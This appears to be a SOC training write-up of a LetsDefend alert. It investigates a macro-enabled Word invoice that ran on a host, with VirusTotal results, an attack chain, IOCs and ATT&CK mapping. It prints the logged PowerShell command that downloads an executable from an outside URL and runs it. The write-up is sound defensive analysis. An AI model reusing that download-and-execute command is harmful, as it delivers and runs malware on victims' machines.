# SOC205 - Malicious Macro Has Been Executed

## Alert Summary

A medium-severity alert was triggered after a malicious Microsoft Word document containing VBA macros was executed on host **Jayne (172.16.17.198)**.

The investigation focused on identifying the document's behavior, verifying whether the macro executed successfully, and determining the actions performed after execution.

---

## Alert Details

| Field | Value |
|---------|---------|
| Alert Name | Malicious Macro Has Been Executed |
| Severity | Medium |
| Hostname | Jayne |
| IP Address | 172.16.17.198 |
| Username | LetsDefend |
| File Name | edit1-invoice.docm |

---

## Initial Triage

The alert indicated the execution of a suspicious Microsoft Word document containing macros.

Primary objectives:

- Determine whether the document was malicious.
- Analyze the macro behavior.
- Identify any additional payloads downloaded or executed.
- Confirm whether the alert represented a real threat.

---

## VirusTotal Analysis

The document hash was analyzed using VirusTotal.

### Detection Results

```text
28 / 63 security vendors detected the file as malicious
```

### Threat Classification

```text
Trojan
Downloader
```

### Family Labels

```text
Logan
W97M
```

---

## Document Analysis

VirusTotal analysis showed that the document contained VBA macros capable of executing shell commands.

Observed findings:

```text
ThisDocument.cls
```

```text
vbaProject.bin
```

### Macro Behavior

The document contained a VBA macro that executed a shell command through a hidden window.

Observed behavior:

```text
Macro Execution
↓
Shell Command
↓
Hidden Execution
```

This allowed commands to run without displaying a visible command window to the user.

---

## Log Analysis

Log Management revealed the execution of PowerShell shortly after the document was opened.

### PowerShell Command

```powershell
POWERSHELL (NEW-OBJECT SYSTEM.NET.WEBCLIENT).DOWNLOADFILE(
'HTTP://WWW.GREYHATHACKER.NET/TOOLS/MESSBOX.EXE',
'MESS.EXE'
);
START-PROCESS 'MESS.EXE'
```

---

## Attack Chain Reconstruction

### Step 1

User opened:

```text
edit1-invoice.docm
```

---

### Step 2

The embedded macro executed a hidden shell command.

---

### Step 3

PowerShell was launched.

---

### Step 4

PowerShell downloaded an executable from:

```text
http://www.greyhathacker.net/tools/messbox.exe
```

---

### Step 5

The downloaded file was saved locally as:

```text
MESS.EXE
```

---

### Step 6

The downloaded executable was launched using:

```powershell
Start-Process 'MESS.EXE'
```

---

## Indicators of Compromise (IOCs)

### Malicious Document

```text
edit1-invoice.docm
```

### SHA256

```text
1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca9538666827e5d96fb0
```

### URL

```text
http://www.greyhathacker.net/tools/messbox.exe
```

### Downloaded Payload

```text
MESS.EXE
```

---

## Analyst ATT&CK Mapping

The following ATT&CK techniques are consistent with the observed behavior:

### User Execution

```text
T1204
```

The user opened a malicious document.

### VBA Macros

```text
T1059.005
```

The document contained VBA macro code.

### PowerShell

```text
T1059.001
```

PowerShell was used to execute commands.

### Ingress Tool Transfer

```text
T1105
```

The script downloaded an executable from an external source.

---

## Findings

The malicious document successfully executed VBA macros which launched PowerShell.

PowerShell downloaded an executable payload from an external server and immediately executed it on the host.

The activity demonstrates a classic malicious document infection chain designed to deliver and execute additional malware.

---

## Verdict

### True Positive

The investigation confirmed malicious macro execution.

The document downloaded and executed an external payload through PowerShell, representing unauthorized code execution on the endpoint.

---

## Lessons Learned

- Office documents containing macros should always be treated with caution.
- VBA macros remain a common malware delivery mechanism.
- PowerShell activity should be reviewed together with command-line arguments.
- Download-and-execute behavior is a strong indicator of malicious activity.
- VirusTotal can provide valuable context when analyzing suspicious files and hashes.
